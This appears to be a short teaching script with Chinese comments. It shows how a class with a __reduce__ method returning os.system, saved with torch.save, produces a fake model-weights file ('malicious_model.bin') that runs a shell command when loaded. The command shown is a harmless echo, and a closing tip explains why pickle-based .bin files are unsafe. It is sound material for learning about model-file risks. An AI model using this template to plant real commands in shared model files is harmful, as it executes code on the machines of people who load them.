import os
import torch

# 定义一个恶意类
# 当 pickle 尝试反序列化这个类的实例时，它会调用 __reduce__ 方法
class MaliciousCode:
    def __reduce__(self):
        # 这个方法告诉 pickle 如何重建对象
        # 这里我们不重建任何东西，而是返回一个可执行的命令
        # tuple 的第一个元素是可调用的函数 (os.system)
        # 第二个元素是传递给该函数的参数
        return (os.system, ('echo "!!! 警告：恶意代码已被执行 !!! 这可能是一个删除文件的命令。"',))

# 创建恶意类的实例
malicious_object = MaliciousCode()

# 使用 torch.save (其内部使用 pickle) 来打包我们的恶意对象
# 将它伪装成一个模型权重文件
file_name = "malicious_model.bin"
torch.save(malicious_object, file_name)

print(f"恶意的 '{file_name}' 文件已创建。")
print("这个文件现在包含一个在加载时会执行命令的 '皮克尔炸弹' (Pickle Bomb)。")





"""
tips:PyTorch 的 .bin 格式使用 Python 的 pickle 模块来打包数据。pickle 的致命弱点在于，它在解包（反序列化）时，可以执行任意代码。
"""